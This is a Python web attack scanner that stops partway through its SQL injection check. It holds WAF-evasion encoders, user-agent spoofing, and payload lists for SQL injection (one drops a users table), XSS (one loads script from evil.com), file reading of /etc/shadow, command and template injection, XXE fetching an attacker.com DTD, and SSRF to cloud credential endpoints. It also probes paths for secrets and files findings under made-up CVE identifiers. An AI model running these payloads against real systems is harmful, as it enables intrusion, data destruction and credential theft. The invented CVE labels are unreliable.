import subprocess
import time
import re
import ssl
import socket
import logging
import random
import hashlib
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import warnings

warnings.filterwarnings("ignore")
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════
#  ROTATING USER-AGENT POOL  (avoids trivial WAF blocks)
# ═══════════════════════════════════════════════════════════════════════════
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'python-requests/2.31.0',
    'curl/7.88.1',
]

# ═══════════════════════════════════════════════════════════════════════════
#  WAF EVASION HELPER
# ═══════════════════════════════════════════════════════════════════════════
class WAFEvasion:
    @staticmethod
    def double_url_encode(payload: str) -> str:
        return quote(quote(payload, safe=''), safe='')

    @staticmethod
    def hex_encode(payload: str) -> str:
        return ''.join([f"\\x{ord(c):02x}" for c in payload])

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return ''.join([f"\\u{ord(c):04x}" for c in payload])

    @staticmethod
    def apply_random_bypass(payload: str) -> str:
        """Applies a random WAF bypass technique."""
        techniques = [
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('OR', '||').replace('AND', '&&'),
            lambda p: ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in p]),
            lambda p: quote(p, safe=''),
            lambda p: WAFEvasion.double_url_encode(p),
            lambda p: p.replace(' ', '\t'),
            lambda p: p.replace(' ', '%09'),
            lambda p: p.replace('UNION', 'UN/**/ION').replace('SELECT', 'SEL/**/ECT'),
        ]
        return random.choice(techniques)(payload)

# ═══════════════════════════════════════════════════════════════════════════
#  COMPREHENSIVE PAYLOAD LIBRARY
# ═══════════════════════════════════════════════════════════════════════════
PAYLOADS = {
    'sqli_error': [
        "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' OR 1=1#", "' OR 'a'='a", "1' ORDER BY 1--", "1' ORDER BY 100--",
        "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
        "'; DROP TABLE users--",
        "1'; SELECT SLEEP(0)--",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
        "' AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--",
        "admin'--", "' or 1=1 limit 1 --", "x' or 'x'='x",
        "') OR ('1'='1", "1 OR 1=1", "1 OR 1=1--",
        "' or ''='",
        # WAF bypass variants
        "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        "IF(1=1, SLEEP(5), 0) --",
        "(SELECT 1 FROM (SELECT(SLEEP(5)))a)",
        "' oR '1'='1",
        "' oR 1=1 --",
        "' OR/**/'1'='1",
    ],
    'sqli_time': [
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "1' AND SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "1 OR SLEEP(5)#",
        "1'); IF(1=1) WAITFOR DELAY '0:0:5'--",
        "1 AND 1=1 WAITFOR DELAY '0:0:5'--",
    ],
    'sqli_waf_bypass': [
        "'/*!50000UNION*//*!50000SELECT*/ NULL--",
        "%2527%2520OR%2520%2531%253D%2531",
        "' /*!OR*/ '1'='1",
        "'\t OR\t '1'='1",
        "' OR/**/1=1--",
        "' OR 0x31=0x31--",
        "%27+OR+%271%27%3D%271",
        "'+or+'1'%3D'1",
        "1/**/OR/**/1=1",
    ],
    'xss_basic': [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "javascript:alert(1)//",
        "'><script>alert(1)</script>",
        '"<script>alert(1)</script>',
        "<script>alert(document.domain)</script>",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    ],
    'xss_waf_bypass': [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "\"><img src=x onerror=alert(document.cookie)>",
        "<details open ontoggle=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<%2fscript><script>alert(1)</script>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<img src=x onerror=with(document)body.appendChild(createElement('script')).src='//evil.com/x.js'>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "';alert(1)//",
        "\" onmouseover=alert(1) \"",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<math><mtext></table><img src=1 onerror=alert(1)>",
        "<form><button formaction=javascript:alert(1)>",
    ],
    'lfi': [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "file:///etc/passwd",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "expect://id",
        "php://input",
        "zip://shell.jpg%23payload.php",
        "phar://payload.phar/shell",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        r"....\/....\/....\/etc\/passwd",
        "..%c0%af..%c0%afetc%c0%afpasswd",
    ],
    'cmdi': [
        "; id",
        "| id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| whoami",
        "\nid\n",
        "|| whoami",
        "; ls -la /",
        "& whoami",
        ";%0Aid",
        "& ping -c 1 127.0.0.1 &",
        "|ping -c 1 127.0.0.1|",
        "|| ping -c 1 127.0.0.1 ||",
        "| nslookup google.com",
        "; nslookup google.com",
        "1; sleep 5",
        "1 | sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "& dir",
        "; dir",
        "| dir",
        "\";id;\"",
    ],
    'ssti': [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__init__.__globals__}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "{{''.__class__.mro()[1].__subclasses__()}}",
        "*{7*7}",
        "@{7*7}",
        "{{7*'7'}}",
        "${7*7}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${{7*7}}",
        "#{7*7}",
        "@(7*7)",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.class.mro[2].subclasses()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root/>',
    ],
    'ssrf': [
        "http://localhost",
        "http://127.0.0.1",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://100.100.100.200/latest/meta-data/",
        "http://[::]:80/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://0/",
        "http://127.1/",
        "http://localhost:6379",
        "http://localhost:9200",
        "http://localhost:5601",
        "http://localhost:8500",
        "dict://localhost:11211/stats",
        "gopher://localhost:6379/_INFO",
    ],
    'open_redirect': [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2F..",
        "/\\evil.com",
        "javascript:alert(1)",
        "//google.com",
        "https://google.com",
        "%2F%2Fevil.com",
        "http://evil.com@trusted.com",
        "///evil.com",
        "////evil.com",
        "//%0Aevil.com",
        "https:evil.com",
        "http://evil%2Ecom",
        "http://evil.com#@trusted.com",
        "//evil.com\\@trusted.com",
    ],
    'idor': [
        "0", "1", "2", "99", "100", "1000",
        "-1", "0x1", "00000001",
        "null", "undefined", "true", "false",
        "admin", "administrator",
        "*", "%00", "../1",
    ],
    'path_traversal': [
        "../", "../../", "../../../",
        "..%2F", "..%2F..%2F",
        "..%252F", "..%c0%af",
        "%2e%2e%2f", "%2e%2e%5c",
        "..\\", "..\\..\\",
    ],
}

SENSITIVE_PATHS = [
    # Admin panels
    '/admin', '/admin/', '/administrator', '/admin.php', '/admin/login',
    '/wp-admin', '/wp-admin/', '/wp-login.php',
    '/backend', '/manager', '/control', '/cpanel', '/panel',
    '/directadmin', '/webmin', '/plesk', '/ispconfig',
    '/admin/config', '/admin/users', '/admin/dashboard',
    # Secret files
    '/.env', '/.env.local', '/.env.production', '/.env.backup', '/.env.bak', '/.env.old',
    '/.git/config', '/.git/HEAD', '/.git/COMMIT_EDITMSG', '/.gitignore',
    '/.htaccess', '/.htpasswd', '/.ssh/id_rsa', '/.ssh/id_dsa', '/.ssh/authorized_keys',
    '/config.php', '/config.yml', '/config.yaml', '/config.json', '/config.php.bak',
    '/settings.py', '/secrets.json', '/credentials.json', '/.docker/config.json',
    '/wp-config.php', '/database.yml', '/application.properties', '/web.config',
    '/local.settings.json', '/appsettings.json', '/appsettings.Development.json',
    # Debug endpoints
    '/debug', '/info.php', '/phpinfo.php', '/server-status', '/server-info',
    '/actuator', '/actuator/env', '/actuator/health', '/actuator/mappings',
    '/actuator/beans', '/actuator/dump', '/actuator/trace', '/heapdump',
    '/actuator/logfile', '/actuator/shutdown', '/actuator/configprops',
    '/_profiler', '/telescope', '/horizon', '/_debugbar', '/__clockwork',
    '/api/debug', '/__debug__', '/__phpmyadmin__', '/phpmyadmin/',
    '/console', '/rails/info', '/rails/info/properties',
    # Backup files
    '/backup', '/backup.zip', '/backup.tar.gz', '/backup.sql', '/backup.tar',
    '/dump.sql', '/db_backup.sql', '/database.sql', '/data.sql',
    '/www.zip', '/site.zip', '/source.zip', '/files.zip', '/archive.zip',
    '/backup.bak', '/site.bak', '/app.bak',
    # APIs & Docs
    '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/graphiql',
    '/swagger', '/swagger-ui.html', '/swagger-ui/', '/api-docs',
    '/openapi.json', '/openapi.yaml', '/redoc', '/v1/api-docs',
    '/api/users', '/api/admin', '/api/internal',
    # Logs
    '/logs', '/error.log', '/debug.log', '/access.log', '/app.log', '/storage/logs/laravel.log',
    '/var/log/apache2/error.log', '/var/log/nginx/error.log',
    # Test/dev files
    '/test', '/phptest.php', '/info.php', '/test.php', '/dev', '/development',
    '/robots.txt', '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml',
    '/.DS_Store', '/Thumbs.db',
    # Source code
    '/app.zip', '/source.tar', '/app.tar.gz',
    # Common endpoints that leak data
    '/users', '/accounts', '/profile', '/me', '/whoami',
    '/.well-known/security.txt', '/.well-known/openid-configuration',
]

RE_SENSITIVE_DATA = {
    'Google API Key':           r'AIza[0-9A-Za-z-_]{35}',
    'Firebase URL':             r'https://[a-z0-9.-]+\.firebaseio\.com',
    'AWS Access Key':           r'AKIA[0-9A-Z]{16}',
    'AWS Secret Key':           r'([^A-Z0-9+/=][A-Z0-9+/=]{40}[^A-Z0-9+/=])',
    'Stripe Secret Key':        r'sk_live_[0-9a-zA-Z]{24}',
    'Stripe Publishable Key':   r'pk_live_[0-9a-zA-Z]{24}',
    'PayPal Braintree Token':   r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
    'GitHub Personal Token':    r'ghp_[a-zA-Z0-9]{36}',
    'GitHub OAuth':             r'gho_[a-zA-Z0-9]{36}',
    'Slack Webhook':            r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+',
    'Slack Token':              r'xox[baprs]-[0-9A-Za-z\-]+',
    'Private Key (RSA/OpenSSH)': r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----',
    'Database Connection':      r'(mysql|postgresql|mongodb|mongodb\+srv)://[a-zA-Z0-9._-]+:[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+(:[0-9]+)?/[a-zA-Z0-9._-]+',
    'Internal IPv4':            r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})',
    'Email Address':            r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
    'Credentials in JS':        r'(password|secret|apikey|access_token|bearer|token)\s*[:=]\s*["\'`]([a-zA-Z0-9._-]{8,})["\'`]',
    'JWT Token':                r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
    'Discord Token':            r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
    'Twilio SID':               r'AC[a-z0-9]{32}',
    'SendGrid Key':             r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}',
    'Social Security Number':   r'\b\d{3}-\d{2}-\d{4}\b',
    'Credit Card Number':       r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11})\b',
}

REDIRECT_PARAMS = [
    'redirect', 'redirect_url', 'redirect_uri', 'redirectUrl',
    'url', 'next', 'goto', 'return', 'returnTo', 'return_url',
    'callback', 'continue', 'destination', 'redir', 'link',
    'forward', 'target', 'location', 'path',
]

ID_PARAMS = ['id', 'user_id', 'uid', 'account', 'user', 'customer', 'order', 'product',
             'file', 'doc', 'document', 'profile', 'record', 'item', 'report']

# ═══════════════════════════════════════════════════════════════════════════
#  OWASP ZAP Integration
# ═══════════════════════════════════════════════════════════════════════════
class WebScanner:
    def __init__(self, zap_api_url: str = "http://localhost:8090"):
        self.zap_api_url = zap_api_url
        self.api_key = "changeme"

    def check_zap_running(self) -> bool:
        try:
            response = requests.get(f"{self.zap_api_url}/JSON/core/action/status/", timeout=5)
            return response.status_code == 200
        except:
            return False

    def start_zap_scan(self, target_url: str) -> Dict:
        logger.info(f"Starting ZAP scan on {target_url}")
        try:
            requests.get(target_url, timeout=10)
            time.sleep(1)
            spider_params = {'apikey': self.api_key, 'url': target_url, 'maxChildren': '10'}
            spider_response = requests.get(f"{self.zap_api_url}/JSON/spider/action/scan", params=spider_params, timeout=30)
            if spider_response.status_code == 200:
                spider_data = spider_response.json()
                scan_id = spider_data.get('scan')
                time.sleep(10)
                active_params = {'apikey': self.api_key, 'url': target_url, 'recurse': 'true'}
                active_response = requests.get(f"{self.zap_api_url}/JSON/ascan/action/scan", params=active_params, timeout=30)
                if active_response.status_code == 200:
                    return {'success': True, 'scan_id': scan_id}
            return {'success': False, 'error': 'Failed to start ZAP scan'}
        except Exception as e:
            logger.error(f"ZAP scan error: {e}")
            return {'success': False, 'error': str(e)}

    def get_zap_alerts(self) -> List[Dict]:
        vulnerabilities = []
        try:
            alerts_response = requests.get(f"{self.zap_api_url}/JSON/core/view/alerts/", timeout=10)
            if alerts_response.status_code == 200:
                alerts_data = alerts_response.json()
                for alert in alerts_data.get('alerts', []):
                    vulnerabilities.append({
                        'cve': f"ZAP-{alert.get('pluginId', 'UNKNOWN')}",
                        'type': alert.get('alert', 'Unknown'),
                        'description': alert.get('description', ''),
                        'severity': self._map_risk_to_severity(alert.get('riskcode', '3')),
                        'url': alert.get('url', ''),
                        'evidence': alert.get('evidence', ''),
                        'epss_score': self._risk_to_epss(alert.get('riskcode', '3'))
                    })
        except Exception as e:
            logger.error(f"Error retrieving ZAP alerts: {e}")
        return vulnerabilities

    def _map_risk_to_severity(self, risk_code: str) -> str:
        return {'0': 'Info', '1': 'Low', '2': 'Medium', '3': 'High', '4': 'Critical'}.get(str(risk_code), 'Unknown')

    def _risk_to_epss(self, risk_code: str) -> float:
        return {'0': 0.1, '1': 0.3, '2': 0.6, '3': 0.8, '4': 0.95}.get(str(risk_code), 0.5)

# ═══════════════════════════════════════════════════════════════════════════
#  DEEP MANUAL VULNERABILITY DETECTOR  ← MASSIVELY UPGRADED
# ═══════════════════════════════════════════════════════════════════════════
class ManualVulnerabilityDetector:

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        self.session.verify = False

    def _rotate_ua(self):
        self.session.headers['User-Agent'] = random.choice(USER_AGENTS)

    def _get(self, url: str, timeout: int = 8, **kwargs) -> Optional[requests.Response]:
        try:
            self._rotate_ua()
            return self.session.get(url, timeout=timeout, allow_redirects=True, **kwargs)
        except Exception:
            return None

    def _post(self, url: str, data=None, json=None, timeout: int = 8, **kwargs) -> Optional[requests.Response]:
        try:
            self._rotate_ua()
            return self.session.post(url, data=data, json=json, timeout=timeout, **kwargs)
        except Exception:
            return None

    def _get_injection_points(self, target_url: str) -> List[Tuple[str, str, str]]:
        """Discover injection points: URL params + form inputs."""
        points = []
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # URL query params
        if parsed.query:
            for key, vals in parse_qs(parsed.query).items():
                points.append((base, key, vals[0]))
        else:
            # Default fuzz params if none in URL
            for param in ['id', 'q', 'search', 'page', 'file', 'url', 'name', 'email',
                          'input', 'query', 'cat', 'category', 'lang', 'ref', 'data']:
                points.append((base, param, '1'))

        # Crawl forms from page
        try:
            resp = self._get(target_url, timeout=5)
            if resp and resp.text:
                forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                                   resp.text, re.IGNORECASE | re.DOTALL)
                for action, form_body in forms:
                    action_url = urljoin(target_url, action) if action else target_url
                    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>',
                                        form_body, re.IGNORECASE)
                    for inp in inputs:
                        points.append((action_url, inp, 'test'))

                # Also grab links with params on the same domain
                links = re.findall(r'href=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                for link in links[:30]:
                    full = urljoin(target_url, link)
                    pl = urlparse(full)
                    if pl.netloc == parsed.netloc and pl.query:
                        for key, vals in parse_qs(pl.query).items():
                            points.append((f"{pl.scheme}://{pl.netloc}{pl.path}", key, vals[0]))
        except Exception:
            pass

        return points

    def _build_url(self, base: str, param: str, payload: str, original_val: str = '1') -> str:
        return f"{base}?{param}={quote(str(payload), safe='')}"

    def _vuln(self, cve: str, vtype: str, severity: str, epss: float,
              description: str, affected_url: str = '', status: str = 'Vulnerable',
              proof_request: str = '', proof_response: str = '') -> Dict:
        return {
            'cve': cve, 'type': vtype, 'severity': severity,
            'epss_score': epss, 'description': description,
            'affected_url': affected_url, 'status': status,
            'proof_request': proof_request, 'proof_response': proof_response[:500] if proof_response else '',
        }

    # ─── SECURITY HEADER CHECKS ───────────────────────────────────────────────
    def _check_security_headers(self, target_url: str) -> List[Dict]:
        vulns = []
        resp = self._get(target_url)
        if not resp:
            return vulns
        h = resp.headers

        header_checks = [
            ('X-Frame-Options',         'CVE-2024-H-001', 'Clickjacking Vulnerability',          'Medium', 0.55),
            ('X-Content-Type-Options',  'CVE-2024-H-002', 'MIME Sniffing Attack',                'Low',    0.30),
            ('Content-Security-Policy', 'CVE-2024-H-003', 'Missing Content Security Policy',     'High',   0.82),
            ('Strict-Transport-Security','CVE-2024-H-004','Missing HSTS (HTTPS downgrade risk)', 'High',   0.75),
            ('Permissions-Policy',      'CVE-2024-H-005', 'Missing Permissions Policy',          'Low',    0.20),
            ('Referrer-Policy',         'CVE-2024-H-006', 'Missing Referrer Policy (info leak)', 'Low',    0.15),
        ]
        for header, cve, vtype, sev, epss in header_checks:
            if header not in h:
                vulns.append(self._vuln(cve, vtype, sev, epss,
                    f"The HTTP response is missing the '{header}' security header, "
                    f"leaving the application exposed to {vtype}.",
                    target_url, proof_response=str(dict(h))))

        # Check if server version is disclosed
        server = h.get('Server', '')
        x_powered = h.get('X-Powered-By', '')
        if server and any(c.isdigit() for c in server):
            vulns.append(self._vuln('CVE-2024-H-007', 'Server Version Disclosure', 'Low', 0.25,
                f"Server header discloses version: '{server}'. Attackers can use this to target version-specific exploits.",
                target_url, proof_response=server))
        if x_powered:
            vulns.append(self._vuln('CVE-2024-H-008', 'Technology Stack Disclosure', 'Low', 0.20,
                f"X-Powered-By header reveals technology: '{x_powered}'.",
                target_url, proof_response=x_powered))
        return vulns

    # ─── COOKIE SECURITY ──────────────────────────────────────────────────────
    def _check_cookie_security(self, target_url: str) -> List[Dict]:
        vulns = []
        resp = self._get(target_url)
        if not resp:
            return vulns
        for cookie in resp.cookies:
            name = cookie.name
            if not cookie.has_nonstandard_attr('HttpOnly') and not getattr(cookie, '_rest', {}).get('HttpOnly'):
                vulns.append(self._vuln('CVE-2024-CK-001', 'Cookie Missing HttpOnly Flag', 'Medium', 0.55,
                    f"Cookie '{name}' is missing the HttpOnly flag. Malicious scripts can steal this cookie via XSS.",
                    target_url, proof_response=f"Set-Cookie: {name}; (no HttpOnly)"))
            if not cookie.secure and target_url.startswith('https'):
                vulns.append(self._vuln('CVE-2024-CK-002', 'Cookie Missing Secure Flag', 'Medium', 0.60,
                    f"Cookie '{name}' is missing the Secure flag. It can be transmitted over unencrypted HTTP.",
                    target_url, proof_response=f"Set-Cookie: {name}; (no Secure)"))
        return vulns

    # ─── CORS MISCONFIGURATION ────────────────────────────────────────────────
    def _check_cors(self, target_url: str) -> List[Dict]:
        vulns = []
        origins_to_test = ['https://evil.com', 'null', 'https://attacker.com',
                           'https://evil.com.trusted.com', f'http://evil.{urlparse(target_url).netloc}']
        for origin in origins_to_test:
            try:
                resp = self.session.get(target_url, timeout=6,
                                        headers={'Origin': origin, 'User-Agent': random.choice(USER_AGENTS)})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                if acao == '*' and acac.lower() == 'true':
                    vulns.append(self._vuln('CVE-2024-CORS-001', 'CORS Wildcard + Credentials', 'Critical', 0.95,
                        "CORS is configured with Access-Control-Allow-Origin: * and Allow-Credentials: true. "
                        "This allows any website to make authenticated cross-origin requests — complete account takeover possible.",
                        target_url, proof_response=f"ACAO: {acao}, ACAC: {acac}"))
                elif acao == origin and acac.lower() == 'true':
                    vulns.append(self._vuln('CVE-2024-CORS-002', 'CORS Arbitrary Origin Reflection', 'High', 0.88,
                        f"Server reflects arbitrary Origin '{origin}' with Allow-Credentials: true. "
                        "Attackers can steal session cookies and tokens cross-origin.",
                        target_url, proof_request=f"Origin: {origin}",
                        proof_response=f"ACAO: {acao}, ACAC: {acac}"))
                elif acao == 'null':
                    vulns.append(self._vuln('CVE-2024-CORS-003', 'CORS Null Origin Trust', 'High', 0.82,
                        "Server trusts null origin. Attackers can send requests from sandboxed iframes to bypass CORS.",
                        target_url, proof_response=f"ACAO: null"))
            except Exception:
                pass
        return vulns

    # ─── SSL/TLS CHECKS ───────────────────────────────────────────────────────
    def detect_ssl_vulnerabilities(self, target_url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(target_url)
        hostname = parsed.hostname or parsed.netloc

        # Check if HTTPS redirects
        if target_url.startswith('http://'):
            try:
                resp = self.session.get(target_url, timeout=5, allow_redirects=False)
                if resp.status_code not in (301, 302, 307, 308):
                    vulns.append(self._vuln('CVE-2024-SSL-001', 'No HTTPS Redirect', 'High', 0.78,
                        "Site does not redirect HTTP to HTTPS. Sensitive data may be transmitted in plaintext.",
                        target_url))
            except Exception:
                pass

        # Check SSL certificate validity
        if hostname:
            try:
                ctx = ssl.create_default_context()
                with socket.create_connection((hostname, 443), timeout=5) as sock:
                    with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        # Check expiry
                        import datetime
                        expire_str = cert.get('notAfter', '')
                        if expire_str:
                            expire_dt = datetime.datetime.strptime(expire_str, '%b %d %H:%M:%S %Y %Z')
                            days_left = (expire_dt - datetime.datetime.utcnow()).days
                            if days_left < 30:
                                vulns.append(self._vuln('CVE-2024-SSL-002', 'SSL Certificate Expiring', 'Medium', 0.60,
                                    f"SSL certificate expires in {days_left} days ({expire_str}). "
                                    "Expired certs break HTTPS and trigger browser warnings.",
                                    target_url, proof_response=f"Expires: {expire_str}"))
            except ssl.SSLError as e:
                vulns.append(self._vuln('CVE-2024-SSL-003', 'SSL Certificate Error', 'High', 0.80,
                    f"SSL certificate validation failed: {str(e)}. Possible MITM or self-signed cert.",
                    target_url, proof_response=str(e)))
            except Exception:
                pass

            # Check for weak TLS protocols
            for proto, name in [(ssl.PROTOCOL_TLSv1, 'TLS 1.0'), (ssl.PROTOCOL_TLSv1_1 if hasattr(ssl, 'PROTOCOL_TLSv1_1') else None, 'TLS 1.1')]:
                if proto is None:
                    continue
                try:
                    ctx_weak = ssl.SSLContext(proto)
                    ctx_weak.check_hostname = False
                    ctx_weak.verify_mode = ssl.CERT_NONE
                    with socket.create_connection((hostname, 443), timeout=3) as sock:
                        with ctx_weak.wrap_socket(sock, server_hostname=hostname):
                            vulns.append(self._vuln('CVE-2024-SSL-004', f'Weak {name} Protocol Support', 'High', 0.82,
                                f"Server still accepts {name} connections which are cryptographically broken.",
                                target_url, proof_response=f"Connected using {name}"))
                except Exception:
                    pass

        return vulns

    # ─── SENSITIVE PATH EXPOSURE ──────────────────────────────────────────────
    def _check_sensitive_paths(self, target_url: str) -> List[Dict]:
        vulns = []
        base = target_url.rstrip('/')
        tested = 0
        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = {ex.submit(self._probe_path, base, path): path for path in SENSITIVE_PATHS}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulns.append(result)
        return vulns

    def _probe_path(self, base: str, path: str) -> Optional[Dict]:
        try:
            url = base + path
            resp = self.session.get(url, timeout=4, allow_redirects=False,
                                    headers={'User-Agent': random.choice(USER_AGENTS)})
            if resp.status_code == 200:
                body_lower = resp.text.lower()
                # Avoid false positives from custom 404s
                if any(fp in body_lower for fp in ['404 not found', 'page not found',
                                                    'not exist', 'does not exist']):
                    return None
                sev = 'Critical' if any(s in path for s in ['.env', '.git', '.ssh', 'config', 'backup', 'sql']) else 'High'
                epss = 0.95 if sev == 'Critical' else 0.80
                return self._vuln(f'CVE-2024-PATH-{abs(hash(path)) % 9000 + 1000}',
                                  'Sensitive Path Exposure', sev, epss,
                                  f"Publicly accessible sensitive path '{path}' returned HTTP 200. "
                                  f"This may expose configuration secrets, credentials, or source code.",
                                  url, proof_request=f"GET {url}",
                                  proof_response=f"HTTP 200 — {len(resp.text)} bytes")
        except Exception:
            return None

    # ─── SQL INJECTION ────────────────────────────────────────────────────────
    def detect_sqli_advanced(self, target_url: str, danger_mode: bool = False) -> List[Dict]:
        vulns = []
        points = self._get_injection_points(target_url)
        payloads = PAYLOADS['sqli_error'][:]
        if danger_mode:
            payloads += PAYLOADS['sqli_waf_bypass'] + PAYLOADS['sqli_time']

        ERROR_MARKERS = [
            'sql syntax', 'mysql_fetch', 'sqlite3', 'oracle error', 'postgresql',
            'mysql error', 'division by zero', 'syntax error', 'unclosed quotation',
            'quoted string not properly terminated', 'pg_exec', 'supplied argument is not a valid mysql',
            'Microsoft OLE DB Provider', 'SQLite3::', 'System.Data.SqlClient',
            'odbc_exec', 'ORA-', 'DB2 SQL error', 'SQLSTATE',
        ]

        limit = 20 if danger_mode else 8
        found_params = set()
        for base, key, val in points:
            if key in found_params:
                continue
            for p in payloads[:limit]:
                try:
                    url = self._build_url(base, key, p)
                    resp = self._get(url, timeout=6)
                    if resp and any(e in resp.text.lower() for e in ERROR_MARKERS):
                        vulns.append(self._vuln(
                            'CVE-2024-SQLI-001', 'SQL Injection', 'Critical', 0.99,
                            f"SQL error message exposed via parameter '{key}' with payload `{p}`. "
                            "Database contents, credentials, and schema may be fully extracted by an attacker.",
                            url, proof_request=f"GET {url}",
